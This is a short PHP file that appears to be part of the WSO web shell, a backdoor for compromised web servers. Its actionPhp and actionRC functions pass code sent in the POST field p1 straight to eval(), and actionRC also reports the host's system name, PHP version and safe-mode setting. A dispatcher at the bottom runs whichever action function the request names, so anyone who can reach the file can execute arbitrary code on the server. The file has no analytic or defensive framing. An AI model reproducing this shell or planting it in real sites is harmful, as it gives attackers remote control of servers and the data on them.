<?php
function actionPhp() {
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	
}


function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"wso_version" => WSO_VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);

?>